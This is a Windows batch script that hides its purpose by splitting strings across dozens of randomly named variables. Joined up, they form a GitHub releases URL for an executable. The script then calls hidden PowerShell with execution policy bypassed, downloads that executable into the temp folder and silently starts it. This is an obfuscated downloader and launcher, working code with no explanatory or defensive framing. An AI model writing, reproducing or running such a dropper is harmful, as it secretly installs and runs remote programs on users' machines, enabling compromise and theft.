@echo off

set "vcuav45=4KPrW97"

set "vvbje46=pY7cT1E"

set "vgebf47=5RlXt"

set "vwoac48=ypChmGLsYp"

set "vwwca49=lECbGh"

set "vhlxb50=b8LJj"

set "vbqri51=4yt46cJmado"

set "vvewy52=haUNDByI"

set "vhjus0=set"

set "vvnze1=lo"

set "vugbl2=cal"

set "vspfo3=UR"

set "vbcaf4=L=ht"

set "vshij5=tp"

set "viuck6=s://"

set "vomxm7=gith"

set "vxzta8=ub"

set "vvmff9=.com"

set "vomjo10=/s"

set "vahtr11=dfgh"

set "vuyya12=uou"

set "vbmoy13=o-d"

set "vtbcq14=ro"

set "veofn15=id/"

set "vrdgb16=8vgh"

set "viiqq17=j7"

set "vbtmb18=6fd"

set "vlowp19=juyf"

set "vlzcj20=6rj"

set "vuzlg21=/re"

set "vhflr22=lea"

set "vapsf23=se"

set "vdqyc24=s/"

set "vhsvr25=down"

set "vchzj26=load"

set "vuwtp27=/bjh"

set "vxxlm28=6ch"

set "vdyia29=nj/I"

set "vazyc30=Dm"

set "vpgtm31=e."

set "vdzud32=exe"

set "vumoc33=se"

set "vkvwd34=t"

set "vuvuo35=se"

set "vsosu36=t"

set "vsels37=se"

set "vrojl38=t"

set "vpfqf39=powe"

set "vqtth40=rshe"

set "vvhje41=ll"

set "vmvxf42=e"

set "vbcok43=x"

set "vvkuv44=it"

%vhjus0%%vvnze1%%vugbl2%



%vumoc33%%vkvwd34% "%vspfo3%%vbcaf4%%vshij5%%viuck6%%vomxm7%%vxzta8%%vvmff9%%vomjo10%%vahtr11%%vuyya12%%vbmoy13%%vtbcq14%%veofn15%%vrdgb16%%viiqq17%%vbtmb18%%vlowp19%%vlzcj20%%vuzlg21%%vhflr22%%vapsf23%%vdqyc24%%vhsvr25%%vchzj26%%vuwtp27%%vxxlm28%%vdyia29%%vazyc30%%vpgtm31%%vdzud32%"

%vuvuo35%%vsosu36% "FILE=%TEMP%\program_download.exe"

%vsels37%%vrojl38% "LOG=%TEMP%\program_download.log"



%vpfqf39%%vqtth40%%vvhje41%.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^

 "$ProgressPreference='SilentlyContinue';" ^

 "try {" ^

 "  Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing -ErrorAction Stop;" ^

 "  if (!(Test-Path '%FILE%' )) { throw 'Download failed' };" ^

 "  Add-Content '%LOG%' 'Download completed';" ^

 "  Start-Process -FilePath '%FILE%';" ^

 "} catch {" ^

 "  Add-Content '%LOG%' ('Error: ' + $_.Exception.Message);" ^

 "  exit 1" ^

 "}"



%vmvxf42%%vbcok43%%vvkuv44% /b

